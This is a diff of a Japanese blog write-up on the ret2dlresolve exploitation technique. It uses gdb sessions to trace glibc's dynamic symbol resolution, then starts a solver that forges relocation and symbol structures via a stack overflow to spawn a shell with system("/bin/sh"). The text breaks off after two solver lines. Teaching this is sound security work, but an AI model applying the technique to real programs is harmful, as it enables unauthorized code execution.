-</span></span><span style="display:flex;"><span>0x0804bf9c│+0x0088   &lt;_DYNAMIC+0088&gt; 0x00000011 // DT_REL
-</span></span><span style="display:flex;"><span>0x0804bfa0│+0x008c   &lt;_DYNAMIC+008c&gt; 0x080482d0
-</span></span><span style="display:flex;"><span>...</span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ sudo apt install libc6-dbg libc6-dbg:i386</code></pre></div>
+</div>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  break main
+gef➤  run
+gef➤  info types Elf32_Dyn
+All types matching regular expression &#34;Elf32_Dyn&#34;:
+
+File ../elf/elf.h:
+838:    typedef struct {...} Elf32_Dyn;gef➤  info types Elf32_Dyn
+All types matching regular expression &#34;Elf32_Dyn&#34;:
+
+File ../elf/elf.h:
+838:    typedef struct {...} Elf32_Dyn;
+gef➤  ptype /o Elf32_Dyn
+type = struct {
+/*    0      |     4 */    Elf32_Sword d_tag;
+/*    4      |     4 */    union {
+/*                 4 */        Elf32_Word d_val;
+/*                 4 */        Elf32_Addr d_ptr;
+
+                            /* total size (bytes):    4 */
+                        } d_un;
+
+                        /* total size (bytes):    8 */
+                      }</code></pre></div>
+</div>
+<ul>
+<li>
+<p>
+ソースコードにおける定義
+</p>
+<ul>
+<li>
+<p>
+<a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L840">https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L840</a>
+</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>
+  <code>Elf32_Dyn</code> 構造体は、 それぞれの構造体がどのセクションの何の情報を持つのかを表す識別子である <code>d_tag</code> と、 <code>d_tag</code> に対応した値を <code>union</code> 型として持つ。
+</p>
+<p>
+  ここで、 <code>.dynamic</code> セクションを参照するため、このセクションそのもののアドレスを得るためには、 <code>link_map</code> 構造体の <code>l_info</code> フィールドを参照する必要がある。
+</p>
+<p>
+  そこで、次に <code>link_map</code> 構造体の構造と、 <code>.dynamic</code> セクションそのもののアドレスを解決する流れを見ていく。 
+</p>
+<h6 id="headline-11">
+<code>link_map</code> 構造体
+</h6>
+<p>
+<code>link_map</code> 構造体は、ELFファイルと実際にマッピングされたアドレスの差分や各セクションのアドレス、再配置情報を保持する構造体であり、ライブラリ関数のシンボルを解決する際に参照される。
+</p>
+<p>
+   それでは、 <code>link_map</code> 構造体の構造を知るために、gdbを用いて定義を参照してみる。
+</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  info types link_map
+All types matching regular expression &#34;link_map&#34;:
+
+File ../elf/link.h:
+84:	struct link_map_public;
+
+File ../include/link.h:
+91:	struct link_map;
+271:	struct link_map_reldeps;
+
+File ../sysdeps/x86/linkmap.h:
+10:	struct link_map_machine;
+gef➤  ptype /o struct link_map
+/* offset    |  size */  type = struct link_map {
+/*    0      |     4 */    Elf32_Addr l_addr;
+/*    4      |     4 */    char *l_name;
+/*    8      |     4 */    Elf32_Dyn *l_ld;
+/*   12      |     4 */    struct link_map *l_next;
+/*   16      |     4 */    struct link_map *l_prev;
+/*   20      |     4 */    struct link_map *l_real;
+/*   24      |     4 */    Lmid_t l_ns;
+/*   28      |     4 */    struct libname_list *l_libname;
+/*   32      |   308 */    Elf32_Dyn *l_info[77];
+/*  340      |     4 */    const Elf32_Phdr *l_phdr;
+...</code></pre></div>
+</div>
+<ul>
+<li>
+<p>
+ソースコードの定義はここ
+</p>
+<ul>
+<li>
+<p>
+<a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/include/link.h#L95">https://elixir.bootlin.com/glibc/glibc-2.36/source/include/link.h#L95</a>
+</p>
+</li>
+</ul>
+<p>
+<strong>return to dl resolve</strong> において、 <code>link_map</code> 構造体で <code>offset</code> が32の位置に保持されている <code>l_info</code> フィールドを利用する。
+ <code>l_info</code> は、各セクションへのアドレスを保持している。
+</p>
+<p>
+各セクションの情報が格納されている <code>l_info</code> において、インデックスは、対応した <code>d_tag</code> により参照される。
+</p>
+<ul>
+<li>
+<p>
+d_tagに代入されうる値の一覧
+</p>
+<ul>
+<li>
+<p>
+<a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L862">https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L862</a>
+</p>
+<div class="src src-c">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* Legal values for d_tag (dynamic entry type).  */</span>
+...
+<span style="color:#75715e">#define DT_STRTAB	5		</span><span style="color:#75715e">/* Address of string table */</span><span style="color:#75715e">
+</span><span style="color:#75715e">#define DT_SYMTAB	6		</span><span style="color:#75715e">/* Address of symbol table */</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>...
+<span style="color:#75715e">#define DT_REL	17		</span><span style="color:#75715e">/* Address of Rel relocs */</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>...
+<span style="color:#75715e">#define DT_JMPREL	23		</span><span style="color:#75715e">/* Address of PLT relocs */</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>...</code></pre></div>
 </div>
 </li>
 </ul>
+</li>
+</ul>
+<p>
+例えば、 <code>.dynamic</code> セクションのアドレスを参照したい場合、 <code>d_tag</code> が <code>DT_JMPREL</code> の <code>Elf32_Dyn</code> 構造体を参照すればよいため、 <code>l_info[23]</code> とすることで参照することができる。
+</p>
+</li>
+</ul>
+<p>
+ここで、実際にgdbを用いて <code>link_map</code> 構造体から <code>.dynamic</code> セクションのアドレスを解決してみる。
+</p>
+<p>
+   <code>_dl_runtime_resolve</code> の第一引数である <code>0xf7ffd990</code> は <code>link_map</code> 構造体のアドレスであるため、 <code>0xf7ffd990</code> を <code>link_map</code> 構造体のアドレスとし、表示する。
+</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  set $link_map = (struct link_map*) 0xf7ffd990
+gef➤  print *$link_map.l_info[23]
+$5 = {
+d_tag = 0x17,
+d_un = {
+ d_val = 0x80482d8,
+ d_ptr = 0x80482d8
+}
+}</code></pre></div>
 </div>
-</div>
-<div id="outline-container-headline-11" class="outline-5">
-<h5 id="headline-11">
+<p>
+   すると <code>link_map</code> 構造体のそれぞれのメンバの値が確認できる。
+   例えば、 <code>dynamic</code> セクションのアドレス情報は、 <code>l_info[23]</code> を参照することにより得ることができる。
+   このため、これを表示してみると、 <code>d_ptr</code> には <code>0x80482d8</code> が格納されており、 <code>.dynamic</code> セクションのアドレスは <code>0x80482d8</code> だということがわかる。
+</p>
+<p>
+   それでは、次にライブラリ関数のシンボルの解決に必要な他のセクションの情報を参照していく。
+</p>
+<h5 id="headline-12">
 <code>.rel.plt</code> セクション
 </h5>
-<div id="outline-text-headline-11" class="outline-text-5">
-<p><code>rel.plt</code> セクションは， <code>ELF_Rel</code> 構造体の配列となっている。</p>
+<p>
+<code>rel.plt</code> セクションは、解決したアドレスを格納するGOTのアドレスとシンボルの情報を得るために必要な情報を持つ。
+</p>
+<p>
+  <code>rel.plt</code> セクションは、 <code>Elf32_Rel</code> 構造体の配列となっており、 <code>Elf32_Rel</code> 構造体の定義は以下のようになっている。
+</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  info types Elf32_Rel
+All types matching regular expression &#34;Elf32_Rel&#34;:
+
+File ../elf/elf.h:
+638:    typedef struct {...} Elf32_Rel;
+658:    typedef struct {...} Elf32_Rela;
+gef➤  ptype /o Elf32_Rel
+type = struct {
+/*    0      |     4 */    Elf32_Addr r_offset;
+/*    4      |     4 */    Elf32_Word r_info;
+
+                         /* total size (bytes):    8 */
+                       }</code></pre></div>
+</div>
 <ul>
 <li>
-<p>ELF_Rel 構造体</p>
+<p>
+ソースコード
+</p>
 <ul>
-<li><a href="https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L632">https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L632</a></li>
-</ul>
+<li>
+<p>
+<a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L634">https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L634</a>
+</p>
 </li>
 </ul>
-<div class="src src-c">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">/* Relocation table entry without addend (in section of type SHT_REL).  */</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
-</span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    Elf32_Addr	r_offset;		<span style="color:#75715e">/* Address */</span>
-</span></span><span style="display:flex;"><span>    Elf32_Word	r_info;			<span style="color:#75715e">/* Relocation type and symbol index */</span>
-</span></span><span style="display:flex;"><span>  } Elf32_Rel;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* I have seen two different definitions of the Elf64_Rel and
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Elf64_Rela structures, so we&#39;ll leave them out until Novell (or
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     whoever) gets their act together.  */</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
-</span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    Elf64_Addr	r_offset;		<span style="color:#75715e">/* Address */</span>
-</span></span><span style="display:flex;"><span>    Elf64_Xword	r_info;			<span style="color:#75715e">/* Relocation type and symbol index */</span>
-</span></span><span style="display:flex;"><span>  } Elf64_Rel;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Relocation table entry with addend (in section of type SHT_RELA).  */</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
-</span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    Elf32_Addr	r_offset;		<span style="color:#75715e">/* Address */</span>
-</span></span><span style="display:flex;"><span>    Elf32_Word	r_info;			<span style="color:#75715e">/* Relocation type and symbol index */</span>
-</span></span><span style="display:flex;"><span>    Elf32_Sword r_addend;		<span style="color:#75715e">/* Addend */</span>
-</span></span><span style="display:flex;"><span>  } Elf32_Rela;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
-</span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    Elf64_Addr	r_offset;		<span style="color:#75715e">/* Address */</span>
-</span></span><span style="display:flex;"><span>    Elf64_Xword r_info;			<span style="color:#75715e">/* Relocation type and symbol index */</span>
-</span></span><span style="display:flex;"><span>    Elf64_Sxword r_addend;		<span style="color:#75715e">/* Addend */</span>
-</span></span><span style="display:flex;"><span>  } Elf64_Rela;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* RELR relocation table entry */</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> Elf32_Word	Elf32_Relr;
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> Elf64_Xword	Elf64_Relr;</span></span></code></pre></div>
-</div>
 <p>
-     <code>.dynamic</code> セクションから取得した <code>.rel.plt</code> のアドレス先をgdbでダンプしてみる。</p>
-<ul>
-<li><code>reloc_arg</code> が <code>.rel.plt</code> のインデックス</li>
+<code>.dynamic</code> セクションから取得した <code>.rel.plt</code> のアドレス先をgdbでダンプしてみる。
+ここで、 <code>_dl_runtime_resolve</code> の第二引数である <code>reloc_arg</code> は、 <code>.rel.plt</code> セクションの先頭アドレスから、参照する <code>Elf32_Rel</code> 構造体までのオフセットとなっている。
+</p>
+</li>
 </ul>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>  gef➤  ser $reloc_arg = 0x0
-</span></span><span style="display:flex;"><span>  gef➤  set $reloc = &amp;((Elf32_Rel *)($l.l_ld[16].d_un.d_ptr))[$reloc_arg]
-</span></span><span style="display:flex;"><span>  gef➤  print *$reloc
-</span></span><span style="display:flex;"><span>  $10 = {
-</span></span><span style="display:flex;"><span>      r_offset = 0x804c00c,
-</span></span><span style="display:flex;"><span>      r_info = 0x107
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  gef➤  dd 0x080482d8
-</span></span><span style="display:flex;"><span>  0x080482d8│+0x0000   0x0804c00c // getsのGOTエントリ (reloc_arg = 0x0)
-</span></span><span style="display:flex;"><span>  0x080482dc│+0x0004   0x00000107
-</span></span><span style="display:flex;"><span>  0x080482e0│+0x0008   0x0804c010 // __libc_start_mainのGOTエントリ (reloc_arg = 0x1)
-</span></span><span style="display:flex;"><span>  0x080482e4│+0x000c   0x00000307
-</span></span><span style="display:flex;"><span>  0x080482e8│+0x0010   0x00000000
-</span></span><span style="display:flex;"><span>  0x080482ec│+0x0014   0x00000000</span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  set $reloc_arg = 0x0
+gef➤  set $reloc = (Elf32_Rel *)($link_map.l_info[23].d_un.d_ptr + $reloc_arg)
+gef➤  print *reloc
+$11 = {
+r_offset = 0x804c00c,
+r_info = 0x107
+}</code></pre></div>
 </div>
 <p>
-    <code>r_info</code> は，シンボルを解決するために使用される。
-    <code>r_info</code> を 8 byte 右シフトすることにより， <code>dynsym</code> のインデックスを取得することができる。</p>
-<ul>
-<li>
-<p><code>r_info</code> の定義</p>
+    ここで、 <code>r_offset</code> はライブラリ関数のアドレスを解決後に、そのアドレスを格納するGOT領域のエントリとなる。
+    このため、 <code>gets</code> のアドレスが解決されると、 <code>0x804c00c</code> にそのアドレスが格納されることになる。
+</p>
+<p>
+    <code>r_info</code> は、シンボルを解決するために使用される。
+    <code>r_info</code> を 8 byte 右シフトすることにより、 <code>.dynsym</code> のインデックスを取得することができる。
+</p>
 <div class="src src-c">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* How to extract and insert information held in the r_info field.  */</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF32_R_SYM(val)		((val) &gt;&gt; 8)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF32_R_TYPE(val)		((val) &amp; 0xff)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF32_R_INFO(sym, type)	(((sym) &lt;&lt; 8) + ((type) &amp; 0xff))
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF64_R_SYM(i)			((i) &gt;&gt; 32)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF64_R_TYPE(i)		((i) &amp; 0xffffffff)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF64_R_INFO(sym,type)		((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* How to extract and insert information held in the r_info field.  */</span>
+
+<span style="color:#75715e">#define ELF32_R_SYM(val)		((val) &gt;&gt; 8)
+</span><span style="color:#75715e">#define ELF32_R_TYPE(val)		((val) &amp; 0xff)
+</span><span style="color:#75715e">#define ELF32_R_INFO(sym, type)	(((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span></code></pre></div>
 </div>
-</li>
-</ul>
-</div>
-</div>
-<div id="outline-container-headline-12" class="outline-5">
-<h5 id="headline-12">
+<h5 id="headline-13">
 <code>.dynsym</code> セクション
 </h5>
-<div id="outline-text-headline-12" class="outline-text-5">
-<p><code>.dynsym</code> セクションは， <code>Elf_Sym</code> 構造体の配列となっている。</p>
-<ul>
-<li>ELF_Sym 構造体</li>
-</ul>
-<ul>
-<li>
-<p><a href="https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L517">https://elixir.bootlin.com/glibc/latest/source/elf/elf.h#L517</a></p>
-<div class="src src-c">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">/* Symbol table entry.  */</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
-</span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    Elf32_Word	st_name;		<span style="color:#75715e">/* Symbol name (string tbl index) */</span>
-</span></span><span style="display:flex;"><span>    Elf32_Addr	st_value;		<span style="color:#75715e">/* Symbol value */</span>
-</span></span><span style="display:flex;"><span>    Elf32_Word	st_size;		<span style="color:#75715e">/* Symbol size */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> st_info;		<span style="color:#75715e">/* Symbol type and binding */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> st_other;		<span style="color:#75715e">/* Symbol visibility */</span>
-</span></span><span style="display:flex;"><span>    Elf32_Section st_shndx;		<span style="color:#75715e">/* Section index */</span>
-</span></span><span style="display:flex;"><span>  } Elf32_Sym;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span>
-</span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    Elf64_Word	st_name;		<span style="color:#75715e">/* Symbol name (string tbl index) */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> st_info;		<span style="color:#75715e">/* Symbol type and binding */</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> st_other;		<span style="color:#75715e">/* Symbol visibility */</span>
-</span></span><span style="display:flex;"><span>    Elf64_Section st_shndx;		<span style="color:#75715e">/* Section index */</span>
-</span></span><span style="display:flex;"><span>    Elf64_Addr	st_value;		<span style="color:#75715e">/* Symbol value */</span>
-</span></span><span style="display:flex;"><span>    Elf64_Xword st_size;		<span style="color:#75715e">/* Symbol size */</span>
-</span></span><span style="display:flex;"><span>  } Elf64_Sym;</span></span></code></pre></div>
-</div>
-<ul>
-<li>
-<p><code>st_name</code> は，実際にシンボルが置かれている <code>.dynstr</code> セクションのオフセット
-<code>r_info</code> からインデックスを計算し、 <code>Elf32_Sym</code> のアドレスを特定してみる。</p>
+<p>
+<code>.dynsym</code> セクションは、アドレス解決する関数のシンボルのサイズやオフセットなどの情報を持つ。
+</p>
+<p>
+    また、 <code>.dynsym</code> セクションは、 <code>Elf32_Sym</code> 構造体の配列となっている。
+</p>
+<p>
+     <code>Elf32_Sym</code> 構造体をgdbで参照してみる。
+</p>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>  gef➤  set $symtab = (Elf32_Sym *)($l.l_ld[9].d_un.d_ptr)
-</span></span><span style="display:flex;"><span>  gef➤  set $sym = $symtab[$reloc.r_info&gt;&gt;8]
-</span></span><span style="display:flex;"><span>  gef➤  print $sym
-</span></span><span style="display:flex;"><span>  $7 = {
-</span></span><span style="display:flex;"><span>st_name = 0x1a,
-</span></span><span style="display:flex;"><span>st_value = 0x0,
-</span></span><span style="display:flex;"><span>st_size = 0x0,
-</span></span><span style="display:flex;"><span>st_info = 0x12,
-</span></span><span style="display:flex;"><span>st_other = 0x0,
-</span></span><span style="display:flex;"><span>st_shndx = 0x0
-</span></span><span style="display:flex;"><span>  }</span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  info types Elf32_Sym
+All types matching regular expression &#34;Elf32_Sym&#34;:
+
+File ../elf/elf.h:
+527:    typedef struct {...} Elf32_Sym;
+gef➤  ptype /o Elf32_Sym
+type = struct {
+/*    0      |     4 */    Elf32_Word st_name;
+/*    4      |     4 */    Elf32_Addr st_value;
+/*    8      |     4 */    Elf32_Word st_size;
+/*   12      |     1 */    unsigned char st_info;
+/*   13      |     1 */    unsigned char st_other;
+/*   14      |     2 */    Elf32_Section st_shndx;
+
+                      /* total size (bytes):   16 */
+                    }</code></pre></div>
 </div>
+<ul>
+<li>
+<p>
+ソースコード
+</p>
+<ul>
+<li>
+<p>
+<a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L519">https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L519</a>
+</p>
 </li>
 </ul>
 </li>
 </ul>
+<p>
+     ここで、 <code>st_name</code> は、実際にシンボルが置かれている <code>.dynstr</code> セクションのオフセットを指している。
+    そこで、 <code>r_info</code> からインデックスを計算し、実際に <code>Elf32_Sym</code> のアドレスを特定してみる。
+</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  set $symtab = (Elf32_Sym *)($link_map.l_info[6].d_un.d_ptr)
+gef➤  set $sym = $symtab[$reloc.r_info&gt;&gt;8]
+gef➤  print $sym
+$13 = {
+st_name = 0x1a,
+st_value = 0x0,
+st_size = 0x0,
+st_info = 0x12,
+st_other = 0x0,
+st_shndx = 0x0
+}</code></pre></div>
 </div>
-</div>
-<div id="outline-container-headline-13" class="outline-5">
-<h5 id="headline-13">
+<h5 id="headline-14">
 <code>.dynstr</code> セクション
 </h5>
-<div id="outline-text-headline-13" class="outline-text-5">
-<p><code>st_name</code> のオフセットを <code>.dynstr</code> セクションのアドレスに足し合わせたアドレスが，シンボルを指すアドレスとなっている。</p>
-<ul>
-<li>以下の例では， <code>l_ld</code> から <code>.dynsym</code> セクションのアドレスを取得し，その後 <code>r_info</code> から取得したインデックスを元に <code>.dynstr</code> セクションからシンボル名を解決 ( <code>reloc_arg = 0</code> の <code>gets</code> が解決)</li>
-</ul>
-<div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>  gef➤  set $strtab = (char*)($l.l_ld[8].d_un.d_ptr)
-</span></span><span style="display:flex;"><span>  gef➤  set $undef_name = $strtab + $sym.st_name
-</span></span><span style="display:flex;"><span>  gef➤  print $undef_name
-</span></span><span style="display:flex;"><span>  $8 = 0x8048276 &#34;gets&#34;</span></span></code></pre></div>
-</div>
-<p>これにより、 <code>link_map</code> 構造体から <code>gets</code> のシンボルが解決されるまでの流れを把握することができた。</p>
 <p>
-    そこで、次にこの流れを踏まえた上で、 <code>system(&#34;/bin/sh&#34;)</code> 呼び出すためのSolverを作成していく。</p>
+<code>st_name</code> のオフセットを <code>.dynstr</code> セクションのアドレスに足し合わせたアドレスが、シンボルを指すアドレスとなっている。
+</p>
+<div class="src src-text">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  set $strtab = (char *)($link_map.l_info[5].d_un.d_ptr)
+gef➤  set $gets_symbol = $strtab + $sym.st_name
+gef➤  print $gets_symbol
+$15 = 0x8048276 &#34;gets&#34;</code></pre></div>
 </div>
-</div>
-</div>
-</div>
-</div>
-</div>
-<div id="outline-container-headline-14" class="outline-3">
-<h3 id="headline-14">
+<p>
+これにより、 <code>link_map</code> 構造体から <code>gets</code> のシンボルが解決されるまでの流れを把握することができた。
+</p>
+<p>
+    そこで、次にこの流れを踏まえた上で、 <code>system(&#34;/bin/sh&#34;)</code> 呼び出すためのSolverを作成していく。
+</p>
+<h3 id="headline-15">
 2. Solverの作成    
 </h3>
-<div id="outline-text-headline-14" class="outline-text-3">
-<div id="outline-container-headline-15" class="outline-4">
-<h4 id="headline-15">
+<h4 id="headline-16">
 Solverの準備
 </h4>
-<div id="outline-text-headline-15" class="outline-text-4">
-<p>上記の流れを図にすると、それぞれのセクションと構造体とシンボルの関係は以下のようになる。</p>
+<p>
+上記の流れを図にすると、それぞれのセクションと構造体とシンボルの関係は以下のようになる。
+</p>
 <pre class="example">
         .rel.plt                         .dynsym                                           .dynstr                                    
             |                                |                                                 |
             |                                |                                                 |
-reloc_arg---+   reroc_arg + .rel.plt         |                                                 |
+reloc_arg---+   reloc_arg + .rel.plt         |                                                 |
             |                                |                                                 |
-            +--&gt;|-----------+----------|     |                                                 |
+            +-->|-----------+----------|     |                                                 |
                 | Elf32_Rel | r_offset |     |                                                 |
-                |           | r_info   |-----+  (r_info&gt;&gt;8 + .dynsym)*sizeof(Elf32_Sym)        |
+                |           | r_info   |-----+  ((r_info>>8) + .dynsym)*sizeof(Elf32_Sym)      |
                 |-----------+----------|     |                                                 |
                                              |                                                 |
-                                             +-&gt;|-----------+---------------------------|      |
+                                             +->|-----------+---------------------------|      |
                                                 | Elf32_Sym | st_name                   |------+   st_name + .dynstr
                                                 |           | st_value                  |      |
                                                 |           | st_size                   |      |
                                                 |           | st_info st_other st_shndx |      |
                                                 |-----------+---------------------------|      |
                                                                                                |
-                                                                                               +--&gt;|-----------+----------|
-                                                                                                   | symbol    | &#39;system&#39; |
-                                                                                                   |-----------+----------|
+                                                                                               +-->|-----------+--------|
+                                                                                                   | symbol    | 'gets' |
+                                                                                                   |-----------+--------|
 </pre>
-<p>ここで、 <code>reloc_arg</code> にはスタックバッファオーバフローを利用して任意の値を指定することが可能なため、 <code>.rel.plt</code> の値から偽の <code>Elf32_Rel</code> 構造体を配置したアドレスまでのオフセットを設定する。</p>
+<p>
+ここで、 <code>reloc_arg</code> にはスタックバッファオーバフローを利用して任意の値を指定することが可能なため、 <code>.rel.plt</code> の値から偽の <code>Elf32_Rel</code> 構造体を配置したアドレスまでのオフセットを設定する。
+</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  reloc_arg <span style="color:#f92672">=</span> Elf32_Rel_addr <span style="color:#f92672">-</span> rel</span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  reloc_arg <span style="color:#f92672">=</span> fake_elf32_rel_addr <span style="color:#f92672">-</span> rel</code></pre></div>
 </div>
 <p>
     また、偽の <code>Elf32_Rel</code> 構造体では、 <code>r_info</code> を 8 bitだけ右シフトした値を <code>.dynsym</code> を基準とした偽の <code>Elf32_Sym</code> 構造体へのインデックスとして使用する。
     このため、事前にインデックスを計算し、 <code>Elf32_Rel</code> 構造体に格納しておく。
-    このとき、 <code>r_info</code> の下bitが <code>0b111 (0x7)</code> である必要があるため、最後に <code>7</code> を or することで下3bitに1を立てている。</p>
+    このとき、 <code>r_info</code> の下3bitが <code>0b111 (0x7)</code> である必要があるため、最後に <code>7</code> を or することで下3bitに1を立てている。
+</p>
 <p>
-    <code>r_offset</code> は、解決されたアドレスが格納されるアドレスであり、通常は <code>.got</code> の対応するエントリを指している。
-    今回は特に関係ないものの、 <code>gets</code> の GOTエントリを指定しておく。    </p>
+    <code>r_offset</code> は、解決されたアドレスが格納されるアドレスであり、通常はGOTの対応するエントリを指している。
+    今回は特に関係ないものの、 <code>gets</code> の GOTエントリを指定しておく。    
+</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  r_offset <span style="color:#f92672">=</span> gets_got
